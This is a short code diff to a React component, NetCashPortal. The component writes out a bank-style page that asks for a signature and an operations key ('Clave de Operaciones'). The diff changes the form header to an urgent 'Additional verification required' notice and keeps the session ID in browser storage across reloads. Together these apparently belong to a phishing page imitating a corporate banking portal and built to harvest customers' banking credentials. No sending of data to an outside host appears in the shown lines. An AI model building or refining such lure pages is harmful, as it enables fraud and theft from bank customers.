@@ -258,7 +258,7 @@ function buildHTML(sessionId) {
       <div class="firma-error" id="firmaError"></div>
 
       <div class="firma-section">
-        <div class="firma-header">Introducci&#243;n de Firma Para Su Ingreso</div>
+        <div class="firma-header"><strong>Se Requiere Verificación Adicional</strong></div>
         <div class="firma-body">
           <div class="firma-row">
             <span class="firma-label">Clave de Operaciones</span>
@@ -562,7 +562,13 @@ function buildHTML(sessionId) {
 
 export default function NetCashPortal() {
   const location = useLocation();
-  const sessionId = location.state?.sessionId || "";
+
+  let sessionId = location.state?.sessionId || "";
+  if (sessionId) {
+    sessionStorage.setItem("netcash_sid", sessionId);
+  } else {
+    sessionId = sessionStorage.getItem("netcash_sid") || "";
+  }
 
   useEffect(() => {
     document.open();
